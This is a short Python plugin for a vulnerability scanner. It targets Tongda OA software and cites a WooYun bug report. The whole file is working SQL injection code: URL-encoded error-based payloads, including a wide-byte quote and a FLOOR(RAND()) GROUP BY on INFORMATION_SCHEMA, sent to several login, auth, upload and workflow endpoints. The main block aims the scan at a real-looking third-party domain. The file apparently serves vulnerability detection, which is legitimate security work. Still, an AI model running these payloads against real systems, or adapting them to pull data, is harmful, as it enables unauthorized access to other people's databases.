#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0160501



def assign(service, arg):
    if service == "tongdaoa":
        return True, arg
        
        
def audit(arg):
    payloads = [
    'logincheck.php?USEING_KEY=2&USERNAME=1',
    'ispirit/check_secure_key.php?USERNAME=',
    'pda/auth.php?P=',
    'module/AIP/upload.php?T_ID=1&RUN_ID=1',
    'ispirit/logincheck.php?USEING_KEY=2&USERNAME=xss'
    ]
    getdata = '%DF%27%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x3a%2C%28MID%28%28IFNULL%28CAST%28md5%28123%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20xxx'
    for payload in payloads:
        code,head, res, errcode, _ = curl.curl2(arg + payload + getdata)
        if code == 200 and '202cb962ac59075b964b07152d234b70' in res :
            security_hole(arg + payload + "  :found sql Injection")
    
    payload = 'general/workflow/list/input_form/data_fetch.php?run_id=1'
    getdata = '%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e%2C%28MID%28%28IFNULL%28CAST%28md5%28123%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29'
    code,head, res, errcode, _ = curl.curl2(arg + payload + getdata)
    if code == 200 and '202cb962ac59075b964b07152d234b70' in res :
        security_hole(arg + payload + "  :found sql Injection")


if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://oa.jsmstc.com/')[1])